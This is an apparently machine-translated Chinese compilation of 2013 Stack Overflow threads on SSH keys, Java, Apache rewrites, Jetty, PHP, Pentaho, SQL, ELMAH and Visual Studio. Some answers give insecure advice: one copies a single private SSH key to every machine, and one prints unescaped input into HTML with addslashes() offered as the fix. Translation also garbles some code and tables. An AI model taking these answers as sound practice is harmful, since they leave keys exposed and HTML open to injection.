当您从工作站通过 SSH 连接到远程系统时，SSH 将使用*本地*私钥`id_rsa`登录，这将针对*远程*系统的`~/.ssh/authorized_keys`文件进行验证。

--

您更新了问题以提及您希望从任何机器 SSH 到任何其他机器。这不被认为是良好的安全实践。相反，您应该有一个包含私钥的“管理员”机器。但是，如果您必须这样做，请将`~/.ssh/id_rsa`私钥复制到您的所有计算机。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:27:14.450

我想您可以将相同的私钥 ( `id_rsa`) 复制到所有机器，并将相同的相应公钥 ( `id_rsa.pub`) 添加到所有机器的`authorized_keys`.

然后你可能想`ssh-agent`在所有机器上运行并注册私钥`ssh-add`

但是，从安全的角度来看，我对此有点不安。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:28:15.393

甚至还有一个命令可以为您执行此操作，以确保事后文件权限正确：

```
ssh-copy-id user@machine 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-15T21:14:58.083

使用`ssh-agent`. 您使用`ssh-add`.

现在使用`ssh -A`. 这会将您的代理转发到另一台主机，并允许您从第一台主机登录到下一台主机。

鉴于您已将公钥（例如使用`ssh-copy-id`）复制到所有主机，因此您可以从任何主机登录到任何其他主机。

# java - 计算Java文本文件中字符串的出现次数

> ID：15232268
> 
> 赞同：0
> 
> 时间：2013-03-05T19:18:32.750
> 
> 标签：java, hashmap, bufferedreader

我正在尝试计算文本文件中一周中出现的天数。截至目前，我的代码计算出现的总数，但我需要它来计算每个关键字的单独出现次数。输出需要看起来像这样

```
Monday = 1
Tuesday = 2
Wednesday = 0 
```

等等

到目前为止，这是我的代码

```
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.util.Map;
import java.util.HashMap;

public class DayCounter
{

public static void main(String args[]) throws IOException 
{

    String[] theKeywords = { "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"};

    // put each keyword in the map with value 0 
    Map<String, Integer> DayCount = new HashMap<String, Integer>();
    for (String str : theKeywords)
    {
        DayCount.put(str, 0);
    }

    try (BufferedReader br = new BufferedReader(new FileReader("C:\\Eclipse\\test.txt")))
    {

        String sCurrentLine;

        // read lines until reaching the end of the file
        while ((sCurrentLine = br.readLine()) != null) 
        {

            if (sCurrentLine.length() != 0) 
            {

                // extract the words from the current line in the file
                if (DayCount.containsKey(sCurrentLine))
                {
                    DayCount.put(sCurrentLine, DayCount.get(sCurrentLine) + 1);
                }
            }
        }

    } 
    catch (FileNotFoundException exception)
    {

        exception.printStackTrace();
    } 
    catch (IOException exception) 
    {

        exception.printStackTrace();
    } 

    int count = 0;
    for (Integer i : DayCount.values()) 
    {
        count += i;
    }

    System.out.println("\n\nCount = " + count);
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:25:22.950

试试这个，而不是只打印总和：

```
for(String day : theKeywords) {
 System.out.println(day + " = " + DayCount.get(day));
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:28:15.050

您正在打印所有天数的总和。相反，您想打印每天的值。所以而不是

```
 for (Integer i : DayCount.values()) 
    {
        count += i;
    } 
```

你应该做

```
for(String Day: theKeywords) {
 System.out.println(Day+ " = " + DayCount.get(day));
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:24:16.287

试试这个：

```
for (String crtDay : dayCount.keySet())
    System.out.println(String.format("%s = %d", crtDay, dayCount.get(crtDay)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T19:25:24.230

只需这样做：

```
for (Entry<String, Integer> count: DayCount.entrySet())
    System.out.println(count.getKey()+" = "+count.getValue()); 
```

# .htaccess - url的相同路径但指向不同的目录

> ID：15232271
> 
> 赞同：2
> 
> 时间：2013-03-05T19:18:37.007
> 
> 标签：.htaccess, mod-rewrite, url-rewriting, rewrite

我试图重定向这个，

**www.example.com/about** *期望与* **docs/about.html匹配**
**www.example.com/register** *期望与* **mod/register.php匹配**

```
RewriteCond %{REQUEST_URI} !\.+$
RewriteRule ^([^\.][a-z]+)$ docs/$1.html [L]
RewriteRule ^([^\.][a-z]+)$ mod/$1.php [L] 
```

第一个重写规则效果很好，
但第二个重写规则不起作用，它一直显示 404 错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:35:31.057

只要您在两个地方都没有相同的文件（例如`/docs/foo.html` *和* `/mod/foo.php`，您可以在重写之前先检查目标：

```
# check for docs/.html first
RewriteCond %{REQUEST_URI} ^/([a-z]+)$
RewriteCond %{DOCUMENT_ROOT}/docs/%1.html -f
RewriteRule ^ /docs/%1.html [L]

# If not .html, then check for mod/.php
RewriteCond %{REQUEST_URI} ^/([a-z]+)$
RewriteCond %{DOCUMENT_ROOT}/mod/%1.php -f
RewriteRule ^ /mod/%1.php [L] 
```

# java - 使用带有 Jetty 的 Guice Servlet 将路径映射到 servlet，而不使用 web.xml

> ID：15232279
> 
> 赞同：4
> 
> 时间：2013-03-05T19:19:02.790
> 
> 标签：java, jetty, guice, embedded-jetty, guice-servlet

我正在努力让 Guice Servlet 配置 Jetty 如何为静态页面提供 Web 请求，在这个简单的情况下。

我创建了一个简单的应用程序，它应该映射两个不同的请求，一个使用 GuiceServlet，另一个不使用。后者有效，而 GuiceServlet 映射的则返回 404 错误。

有小费吗？我正在使用：JDK 1.7.0_15；eclipse.jetty.jetty-servlet 8.1.9.v20130131；guice-servlet 3.0。谢谢。

```
public class Main {
    public static void main(String... args) {
        Guice.createInjector().getInstance(Main.class).start();
    }

    public void start() {
        Server server = new Server(8080);
        ServletContextHandler handler = new ServletContextHandler(server, "/", ServletContextHandler.SESSIONS);
        handler.addEventListener(new MyGuiceServletConfig());
        handler.addServlet(MyServlet.class, "/non-guice");
        server.setHandler(handler);
        try {
            server.start();
            server.join();
        } catch (Exception e) {
            e.printStackTrace();
        }       
    }
}

public class MyGuiceServletConfig extends GuiceServletContextListener {
    @Override
    protected Injector getInjector() {
        return Guice.createInjector(new ServletModule() {
            @Override
            protected void configureServlets() {
                System.out.println("MyGSC->getInjector->configureServlets"); //I'm seeing this in the console...
                serve("/guice").with(MyServlet.class);
            }
        });
    }
}

@Singleton
public class MyServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.getWriter().print("Hello!\nYour path is: " + request.getServletPath());        
    }
} 
```

除此之外，创建各种注射器的最佳方法是什么？我的 main(..) 结构是这样的，这样我就可以插入其他模块，让 MyServletModule 在 MyGuiceServletConfig 中指定，正如我在某处看到的那样 - 这是正确的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T21:13:20.293

我最终能够以一种有效的方式简单得多。需要为“/”路径添加 DefaultServlet：

```
public class MyMain {
    public static void main(String... args) throws Exception {
        Guice.createInjector(new MyServletModule());
        Server server = new Server(8080);    
        ServletContextHandler handler = 
            new ServletContextHandler(server, "/", ServletContextHandler.SESSIONS);
        handler.addFilter(GuiceFilter.class, "/*", allOf(DispatcherType.class));
        handler.addServlet(DefaultServlet.class, "/");
        server.start();
    }
}

@Singleton
public class MyServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.getWriter().print("Hello!\nYour path is: " + request.getServletPath());        
    }
}

public class MyServletModule extends ServletModule {
    @Override
    protected void configureServlets() {
        serve("/guice").with(MyServlet.class);
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:28:52.883

如果您希望 Jetty 提供静态内容，请确保您也配置了 DefaultServlet。

在 Jetty 嵌入式示例树中找到的示例：[OneServletContext.java](http://git.eclipse.org/c/jetty/org.eclipse.jetty.project.git/tree/example-jetty-embedded/src/main/java/org/eclipse/jetty/embedded/OneServletContext.java?id=jetty-8.1.9.v20130131)

```
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.servlet.DefaultServlet;
import org.eclipse.jetty.servlet.ServletContextHandler;
import org.eclipse.jetty.servlet.ServletHolder;

public class OneServletContext
{
    public static void main(String[] args) throws Exception
    {
        Server server = new Server(8080);

        ServletContextHandler context = new ServletContextHandler(ServletContextHandler.SESSIONS);
        context.setContextPath("/");
        server.setHandler(context);

        // Serve static content from /tmp
        ServletHolder holder = context.addServlet(DefaultServlet.class,"/tmp/*");
        holder.setInitParameter("resourceBase","/tmp");
        holder.setInitParameter("pathInfoOnly","true");

        // Serve some hello world servlets
        context.addServlet(new ServletHolder(new HelloServlet()),"/*");
        context.addServlet(new ServletHolder(new HelloServlet("Buongiorno Mondo")),"/it/*");
        context.addServlet(new ServletHolder(new HelloServlet("Bonjour le Monde")),"/fr/*");

        server.start();
        server.join();
    }
} 
```

这会将文件系统目录`/tmp`中的内容作为`http://localhost:8080/tmp/`.

例子：

```
File System       URL
/tmp/hello.txt    http://localhost:8080/tmp/hello.txt
/tmp/a/hi.txt     http://localhost:8080/tmp/a/hi.txt
/tmp/index.html   http://localhost:8080/tmp/ 
```

# jquery - jquery zclip插件没有触发

> ID：15232284
> 
> 赞同：0
> 
> 时间：2013-03-05T19:19:11.063
> 
> 标签：jquery, zclip

我在委托中使用 .on() 方法将按钮单击绑定到 zclip 插件，如下所示：

```
$(document).ready(function () {
    $("body").on("click", "#copy-button", function () {
        $(this).zclip({
            path: "http://zeroclipboard.googlecode.com/svn-history/r10/trunk/ZeroClipboard.swf",
            copy: function () {
                var text = 'copied text';
                return text;
            }
       })
    })
}) 
```

对于我的一生，我无法将任何内容复制到剪贴板，有人有建议吗？

这是一个小提琴：

[http://jsfiddle.net/sTa32/](http://jsfiddle.net/sTa32/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:23:23.377

您的路径不包括任何内容。更改您的路径，例如：[http ://www.hurtwood.demon.co.uk/Fun/copter.swf](http://www.hurtwood.demon.co.uk/Fun/copter.swf)

而且您需要为视图添加一些 CSS，因为它非常小

# ios - UIDocument 和 NSFileWrapper - NSFastEnumerationMutationHandler 在保存期间更改文件包装器

> ID：15232287
> 
> 赞同：9
> 
> 时间：2013-03-05T19:19:16.397
> 
> 标签：ios, thread-safety, save, uidocument, nsfilewrapper

我有一个`UIDocument`基于 s 的应用程序`NSFileWrapper`来存储数据。“主”文件包装器包含许多附加的目录文件包装器，每一个都代表文档的不同页面。

`UIDocument`每当我在保存（在）时对文档进行更改时`writeContents:andAttributes:safelyToURL:forSaveOperation:error:`，应用程序就会崩溃。这是堆栈跟踪：

![UIDocument 崩溃堆栈跟踪](../Images/f93762883fee06caa3b3e81a881fc13a.png)

很明显，我正在修改`UIDocument`在后台枚举的文件包装器的同一实例。实际上，我检查了在返回数据模型的快照时`contentsForType:error:`，返回的子文件包装器指向与数据模型中当前驻留（和正在编辑）的对象相同的对象，而不是副本。

```
- (id)contentsForType:(NSString *)typeName error:(NSError *__autoreleasing *)outError
{
    if (!_fileWrapper) {
        [self setupEmptyDocument];
    }
    return [[NSFileWrapper alloc] initDirectoryWithFileWrappers:[_fileWrapper fileWrappers]];
} 
```

这是实施此方法的认可方法（根据[WWDC 2012 Session 218 - Using iCloud with UIDocument](http://adcdownload.apple.com//wwdc_2012/wwdc_2012_session_pdfs/session_218__using_icloud_with_uidocument.pdf)）。

所以我想问题是：**这种方法如何是线程安全的？**

当主文件包装器`fileWrappers`本身是目录文件包装器时，情况是否有所不同？如果制裁的方法是错误的，*应该*怎么做？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-12T03:24:06.117

如果您正在调用任何`writeContents:...`方法，则不应如此。你应该打电话`saveToURL:forSaveOperation:completionHandler:`。这些`writeContents:...`方法用于高级子类化。

`UIDocument`使用两个线程 - 主线程和“UIDocument 文件访问”线程（如果您将更多的子类化`UIDocument`，您可以在 via 中执行操作`performAsynchronousFileAccessUsingBlock:`）。

线程安全`UIDocument`就像 Objective C 中的任何东西一样——只让拥有一个对象的线程修改它。如果您要更改的对象正在被读取，请在写入完成后将其排队等待更改。也许更改您的子类拥有的不同对象`UIDocument`并将它们拉入新`NSFileWrapper`的`contentsForType:error:`. 传递 fileWrappers 的副本`NSDictionary`。

`NSFileWrapper`实际上将整个文档加载到内存中。`NSFileWrapper`实际上是在方法中的“UIDocument 文件访问”线程中创建的，`readFromURL:error:`然后将其传递给`loadFromContents:ofType:error:`方法。如果您有一个大文件，这可能需要一段时间。

保存时，您通常希望决定何时执行此操作，并通过该方法（参数是）`UIDocument`让它知道某些内容已更改。当你*现在*想保存一些东西时，你想使用该方法。`updateChangeCount:``UIDocumentChangeDone`*`saveToURL:forSaveOperation:completionHandler:`*

 *要注意的另一件事是`UIDocument`实现`NSFilePresenter`协议，该协议定义了`NSFileCoordinator`要使用的方法。唯一的`UIDocument`坐标写入根文档，而不是子文件。您可能认为在文档中协调子文件可能会有所帮助，但是您遇到的崩溃与在迭代时更改字典有关，因此这无济于事。`NSFilePresenter`如果您 (1) 想要获得文件更改通知，或者 (2) 另一个对象或应用程序正在读取/写入同一个文件，您只需要担心自己编写。已经做的事情`UIDocument`会很好。但是，您确实希望`NSFileCoordinator`在移动/删除整个文档时使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-10-16T03:14:04.217

我知道这是一个古老的线程，但我最近遇到了这个问题，为了帮助未来的旅行者：如果你的主文件包装器中有子目录，你还需要复制那些 NSFileWrapper （除了复制上面的根 NSFileWrapper ）。

否则，当 UIDocument 后台线程在保存时枚举它们并且同时在主线程上发生修改时，可能会发生崩溃。目前尚不清楚，但这可能是 OP 遇到的问题。

另一个提示是您还需要复制子目录的 NSFileWrapper 的文件名、文件属性（可能还有首选文件名），以便增量保存工作。

HTH。*

# php - 尝试在 HTML 输入文本中回显 PHP 变量

> ID：15232288
> 
> 赞同：1
> 
> 时间：2013-03-05T19:19:20.057
> 
> 标签：php, html, echo

我无法更改该变量，因为这是我使用 IMAP 从邮件服务器接收它的方式。

```
$sender = '"Smith, John"'; 
```

这是我的html：

```
<td>To:</td>
<td><input name="To" id="to" type="text" size="80" onfocus="changeBg('to','#FFF')"
value= <?php echo $sender; ?> /></td> 
```

这是我得到的输出：

```
 To: Smith,John     /> 
```

我怎样才能逃避“”或者我应该怎么做才能删除输出末尾的“/>”？我已经尝试了在网上找到的每个示例，但没有任何效果。可以请任何人给我帮助吗？

我希望文本只是在输入文本框中，如下所示：

```
To: Smith, John 
```

提前致谢。

编辑：

当我尝试以下操作时，它可以工作，但最后没有关闭输入（/>）

```
 <td><input name="To" id="to" type="text" size="80" onfocus="changeBg('to','#FFF')"
 <?php echo 'value='.$sender; ?>" </td> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:21:01.053

用引号将值括起来：

```
<td><input name="To" id="to" type="text" size="80" onfocus="changeBg('to','#FFF')" value="<?php echo $sender; ?>" /></td> 
```

另外，用`addslashes()`

# c++ - OPENCV Python接口实现

> ID：15232289
> 
> 赞同：1
> 
> 时间：2013-03-05T19:19:20.660
> 
> 标签：c++, python, opencv

我用 C++ 完成了一个图像处理算法，我想为此构建一个 Python 接口，以便与其他代码（主要是用 Python 编写的机器学习代码）集成。

OpenCV的python接口是如何实现的？我想效仿它。我认为他们不使用 SWIG，而是使用其他东西。

# pentaho - 使用 Pentaho Kettle/PDI 将行列转换为行

> ID：15232294
> 
> 赞同：6
> 
> 时间：2013-03-05T19:19:31.343
> 
> 标签：pentaho, kettle

Pentaho 的全新用户（以及一个新手 SO 海报，请注意！）

我想使用 Kettle/PDI 来转换来自 RDBMS 的数据（例如）：

```
问题1 问题2 问题3 问题4
2013 年 1 月 1 日 123.00 测试 1 测试 1.1
2013 年 1 月 2 日 124.00 测试 2 测试 1.2
2013 年 1 月 3 日 125.00 测试 3 测试 1.3
1/4/13 126.00 测试 4 测试 1.4
2013 年 1 月 5 日 127.00 测试 5 测试 1.5

```

对此：

```
QuestionName AnswerDate AnswerNumber AnswerString
问题 1 2013 年 1 月 1 日     
问题 1 2013 年 1 月 2 日     
问题 1 2013 年 1 月 3 日     
问题 1 2013 年 1 月 4 日     
问题 1 2013 年 1 月 5 日     
问题2 123.00
问题2 124.00
问题2 125.00
问题2 126.00
问题2 127.00
问题 3 测试 1
问题 3 测试 2
问题 3 测试 3
问题 3 测试 4
问题 3 测试 5
Question4 测试1.1
Question4 测试 1.2
Question4 测试1.3
Question4 测试 1.4
Question4 测试 1.5

```

正如上面所希望的那样，原始表中的每个可用数据类型都应该有一个“Answer<FieldDataType>”列。PDI可以做到这一点吗？如果是这样，有人可以为我提供一些指示吗？我已经尝试使用[Row Normaliser](http://wiki.pentaho.com/display/EAI/Row+Normalizer)步骤来旋转表格并分配新字段，但我可能做得不太正确（或者存在错误 [PDI 4.4]）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-11T11:55:42.427

使用 javascript 步骤：

```
trans_Status = SKIP_TRANSFORMATION;
var row1 = createRowCopy(4); 
var row2 = createRowCopy(4); 
var row3 = createRowCopy(4); 
var row4 = createRowCopy(4); 
row1[0] = 'Question1';
row2[1] = 'Question2';
row3[2] = 'Question3';
row4[3] = 'Question4';
row1[1] = Question1;
row2[2] = Question2;
row3[3] = Question3;
row4[3] = Question4;
putRow(row1);
putRow(row2);
putRow(row3);
putRow(row4); 
```

不要忘记添加字段；

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-27T19:54:59.287

我通过使用脚本步骤编写输出行来完成此操作，该输出行包含输入行中每一列的列和值。从那里，我进入正则[表达式评估](http://wiki.pentaho.com/display/EAI/Regex+Evaluation)步骤并使用多个捕获组将值类型映射到流中的其他列。我用 Row Normaliser 搞砸了一段时间，但无法让它完全按照我的意愿去做。使用脚本步骤的性能损失可以忽略不计。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-13T02:31:13.977

Row Normalizer 对您指定反规范化的顺序非常敏感。

我有一个稀疏矩阵输入并发现了以下规则：

1.  类型值必须组合在一起，如与 like
2.  每个类型分组的新字段列的顺序必须相同
3.  类型组必须首先排列为人口最多，最后人口最少

因此，如果在您指定的示例中

```
 Fieldname  Type   new field
 Question1  date   AnswerDate
 Question2  number AnswerNumber
 Question3  string AnswerString
 Question4  string AnswerString 
```

会比

```
 Fieldname  Type   new field
 Question1  date   AnswerDate
 Question3  string AnswerString
 Question2  number AnswerNumber
 Question4  string AnswerString 
```

# dom - Backbone 可以与 Mootools 一起使用吗？

> ID：15232296
> 
> 赞同：0
> 
> 时间：2013-03-05T19:19:33.043
> 
> 标签：dom, backbone.js, mootools

我想知道是否有人有使用 Mootools 编写 Backbone 应用程序的经验，因为它是 ajax/dom 库而不是 jQuery。我知道这是可能的，但这会让人头疼吗？有什么我需要知道的问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T09:37:16.523

好吧，我目前正在使用@Dimitar Christoff 在此处链接的 MooTools 适配器的修改版本，它支持事件。

我还修改了它以使用 MooTools`agent`而不是`Request`，之后我意识到我可以编写自己的适配器，这样我就可以使用所有新的 MooTools 东西（即构成 MooTools 2.0 的 Prime、Agent、Moofx 和 Elements），该 repo 就在这里: [https://github.com/kentaromiura/Marrow](https://github.com/kentaromiura/Marrow)

虽然它仍处于 alpha 阶段，并且代码只是被组合在一起以使测试通过，但它现在似乎正在工作。

我认为原始适配器的每一点都已被复制，而其他功能则可以通过`Elements`和`Slick`.

不过，这可能不是您所说的“MooTools”，所以我将研究分支我的存储库并复制我对原始适配器所做的所有更改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T04:19:12.417

Backbone**需要**JQuery 或 Zepto... DOM 操作和 Ajax 都**需要其中之一...**

# c++ - 使用c ++的多边形区域？

> ID：15232299
> 
> 赞同：-4
> 
> 时间：2013-03-05T19:19:38.163
> 
> 标签：c++, polygon, area

如何仅通过知道构成多边形的点的 x 和 y 坐标来计算 C++中*多边形的**面积？*

 ** * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:24:47.860

只要您正在处理非自相交多边形，一个简单的谷歌搜索就会显示答案。如果多边形上的点按逆时针顺序排列，则该区域的符号为正。这个公式不假设多边形是凸的。

[http://mathworld.wolfram.com/PolygonArea.html](http://mathworld.wolfram.com/PolygonArea.html)

在这里，通过对相邻点的确定值求和来找到该区域。每个确定项计算由向量形成的平行四边形的面积，例如 (x1,y1) 和 (x2,y2)（其中两个向量都源自原点 (0,0)）。除以 2 得出三角形的面积。在多边形周围旅行时，如果您的多边形是凸的，则三角形将具有正面积。否则，在凹多边形的情况下，这些三角形的负区域将与它们的正对应区域相抵消，从而为您提供正确的结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:26:13.460

简单的维基百科搜索显示了答案：

[http://en.wikipedia.org/wiki/Polygon#Area_and_centroid](http://en.wikipedia.org/wiki/Polygon#Area_and_centroid)*

# mysql - 我的场景中需要正确的 SQL 语句

> ID：15232300
> 
> 赞同：0
> 
> 时间：2013-03-05T19:19:41.483
> 
> 标签：mysql, .net, vb.net

在我的数据库中获得我想要的结果时遇到问题。我想从其他表中提取总行数，其中它的条件将属于另一个表。为了清楚起见，这里是示例插图。

```
>tblBus
>
>Bus ID ~ Day~ Type 
>
>1000 | Monday |  Public

>2000|Monday | Private

>3000|Tuesday| Public

>4000|Monday | Public

>tblReservation 
>
>Bus ID | Date

>1000   | 2013/3/4

>2000   | 2013/3/4

>3000   | 2013/3/6 
```

假设预订日是星期一，即 2013/3/4.. 我想显示星期一可用的所有公共巴士，并在新行中显示该巴士上的预订总数。

例如

GeneratedTable (WHERE Date ='2013/3/4', Type='Public', Day='Monday')

```
>Bus ID | Day | Type | TotalNumberReservation

>1000   |Monday | Public | 1

>4000   |Monday | Public | 1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:22:30.273

您可以使用以下内容加入您的表格`bus id`，然后获取预订数量：

```
select b.`bus id`,
  b.day,
  b.type,
  count(r.date) TotalNumberReservation
from tblBus b
inner join tblReservation r
  on b.`bus id` = r.`bus id`
where r.date = '2013-03-04'
  and b.day = 'Monday'
group by b.`bus id`, b.day, b.type 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!2/91238/8)

如果您想返回与正确日期匹配的所有行，即使没有预订，那么您将需要使用`LEFT JOIN`：

```
select b.`bus id`,
  b.day,
  b.type,
  count(r.date) TotalNumberReservation
from tblBus b
left join tblReservation r
  on b.`bus id` = r.`bus id`
  AND r.date = '2013-03-04'
where b.day = 'Monday'
group by b.`bus id`, b.day, b.type 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!2/91238/7)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:24:40.127

这是生成所有巴士、日期和日期的计数的基本查询，然后您可以根据需要进行过滤：

```
Select a.bus_id, day, type, count(*) as TotalNumberReservation
  from tblBus a
  join tblReservation b
    on a.busId=b.busId
 group by a.bus_id,day,type 
```

# javascript - 在 Internet Explorer 中通过 JavaScript 请求 YouTube API JSON 提要的问题

> ID：15232301
> 
> 赞同：0
> 
> 时间：2013-03-05T19:19:44.573
> 
> 标签：javascript, json, internet-explorer, xmlhttprequest, youtube-api

我一直在使用 youtube api 和 javascript 来生成一个播放器区域，然后是允许用户单击并滚动视频以在播放器区域播放新视频的箭头。这在所有其他浏览器中都可以正常工作，除了 ie，它似乎在 ie7、8 和 9 中播放，但仅在某些操作系统上。例如，在 Windows 8 中使用模拟器似乎很好。有什么帮助吗？

JSfiddle： http: [//jsfiddle.net/9bBCG/](http://jsfiddle.net/9bBCG/)（由于某种原因在这里不起作用，认为 json 提要可能不起作用 - 但代码确实起作用）

这是我检索提要的地方：

```
var playListURL = 'http://gdata.youtube.com/feeds/api/users/BadbyMicroMovies/uploads?v=2&alt=json';
var videoURL= 'http://www.youtube.com/watch?v=';

$.getJSON(playListURL, function(data) {
    var list_data="";
    $.each(data.feed.entry, function(i, item) {
        var feedTitle = item.title.$t;
        var feedURL = item.link[1].href;
        var fragments = feedURL.split("/");
        var videoID = fragments[fragments.length - 2];
        var url = videoURL + videoID;
        var thumb = "http://img.youtube.com/vi/"+ videoID +"/default.jpg";
        list_data += '<li><a class="vid-link" href="'+ url +'?rel=0" title="'+ feedTitle +'"><img alt="'+ feedTitle+'" src="'+ thumb +'"</a></li>';
    });
    $(list_data).appendTo("#youtube-feed"); 
```

非常感谢任何帮助，因为我很困惑！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T18:20:51.347

Internet Explorer 仅在版本 10 中开始支持标准[CORS](http://en.wikipedia.org/wiki/Cross-origin_resource_sharing)。如果您使用的是旧版本的 Internet Explorer，则无法使用`XMLHttpRequest`（该`$.getJSON()`调用正在执行的操作）直接请求不同域上的资源。

相反，您需要使用[JSON-P 之](http://en.wikipedia.org/wiki/JSONP)类的方法，该方法也适用于其他浏览器。您可以通过使用`$.ajax()`调用而不是来执行此操作`$.getJSON()`，并指定`dataType: 'jsonp'`参数，如[jQuery 文档](http://api.jquery.com/jQuery.ajax/)中所述。

# vb6 - 什么是触发功能

> ID：15232311
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:20:24.263
> 
> 标签：vb6

什么是事件驱动编程的触发功能？尤其是关于 vb6。

我已经尽可能彻底地搜索了 microsoft 文档并想出了一个空白。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:21:35.543

VB6 中没有“触发函数”之类的东西。我想你对措辞有点误解了。

事件是应用程序中发生的事情的概念，例如按钮单击、鼠标移动、表单加载等。

每个事件都可以由事件处理程序处理，该事件处理程序是在给定对象上发生给定事件时执行的函数，例如 Button1_Click 用于处理名为 Button1 的按钮上的 Click 事件。注意：此函数称为 Handler 函数，而不是 Trigger 函数。

一个事件可能被触发（通常称为引发），这意味着一个对象向环境表明该事件已经发生。在上面的示例中，名为 Button1 的按钮触发/引发 Click 事件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:53:12.300

触发器在 DB 环境（SQL Server 等）中很常见。据我所知，VB6 本身没有触发器。

当表中的数据发生变化（插入新记录等）时，您可以在表上应用触发器以执行特定任务。

[有关 SQL Server 触发器的详细信息](http://msdn.microsoft.com/en-us/library/ms178110.aspx)

# .net - 为什么我的 web 项目找不到我的 elmah.axd 文件

> ID：15232319
> 
> 赞同：13
> 
> 时间：2013-03-05T19:20:46.263
> 
> 标签：.net, asp.net-mvc-3, exception-handling, web-config, elmah

在我的 web.config 文件中，我拥有运行 elmah 所需的所有对 elmah 的引用。除了这部分代码：

```
<location path="elmah.axd">
    <system.web>
        <authorization>
            <allow roles="admin" />
            <deny users="*" />
        </authorization>
    </system.web>
</location> 
```

ReSharper 或 Visual Studio 都给了我错误：

> 位置元素未使用：在 elmah.axd 路径中找不到项目：未找到 Web 项目的路径\elmah.axd

我从 NuGet 安装了 elmah 包并保存了 dll，当我转到站点的根目录并键入 root/elmah.axd 时，我可以访问 elmah 日志；但是，我需要将这些日志的访问权限限制为管理员。

我有两个用户：管理员和用户我只希望具有管理员角色的用户访问 elmah 日志。

我错过了这个难题的一部分吗？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-03-05T20:56:53.227

没有错……只是 reSharper 有点傻。因为它找不到具有该名称的物理文件，它认为它不存在并给你你所看到的错误。

您可以使用 ReSharper 禁用注释来忽略它，如下所示：

```
<!-- ReSharper disable WebConfig.RedundantLocationTag -->
<!-- ReSharper disable WebConfig.WebConfigPathWarning -->
<location path="elmah.axd">
<!-- ReSharper restore WebConfig.WebConfigPathWarning -->
  <system.web>
    <authorization>
      <allow roles="admin" />
      <deny users="*" />
    </authorization>
  </system.web>
</location>
<!-- ReSharper restore WebConfig.RedundantLocationTag --> 
```

但它看起来很丑;-)

# visual-studio - 在 Visual Studio 中继承构建后事件？

> ID：15232329
> 
> 赞同：7
> 
> 时间：2013-03-05T19:21:13.607
> 
> 标签：visual-studio, visual-studio-2012, post-build-event

`bar`我在 Visual Studio 中有一个解决方案，其中我有一个共享属性表，其中包含一个需要为每个项目执行的构建后事件命令 ( )。

> Foo.props > Common Properties > Build Events > Post-Build Event > Command Line = bar

然后如何指定其他特定于项目的构建后事件？缺少通常的“从父级或项目默认值继承”，我宁愿不必手动添加`bar`到每个项目，因为它很难维护。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2014-03-30T20:22:07.847

在找到此解决方案并查看其他帖子后。我发现无法理解为什么 VC++ 团队会忽略此功能。

在查看属性页的宏后，您可以使用 %(Command) 宏/环境变量包含来自先前属性的命令。这适用于所有构建事件。

PropertySheet1.props

```
copy some.dll $(OutputPath)
%(Command) 
```

PropertySheet2.props

```
copy other.dll $(OutputPath)
%(Command) 
```

导致所有命令都被执行。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-12-09T12:19:55.993

根据这篇[文章](http://social.msdn.microsoft.com/Forums/vstudio/en-US/e2557d68-40b4-4488-acbc-6e5493143bf3/cannot-inherit-postbuild-event-using-vsprops-property-sheets)，这似乎是不可能的。您不久前发布了您的问题；您是否设法找到可行的替代方案？

* * *

反馈后编辑：一个潜在的混乱选择是将您的命令定义为宏：

```
<!-- CommandX.props -->
<PropertyGroup>
  <CommandX>bar</CommandX>
</PropertyGroup> 
```

然后您可以添加`$(CommandX)`到项目的构建后命令或另一个属性表。如果`$(CommandX)`不存在，它会被悄悄地忽略。

如果将此宏添加到另一个属性表，那么您必须`Import`在`CommandX`属性表中`$(CommandX)`继承一个值：

```
<!-- Some-Other-Property-Sheet.props -->
<ImportGroup Label="PropertySheets">
  <Import Project="CommandX.props" />
</ImportGroup> 
```

* * *

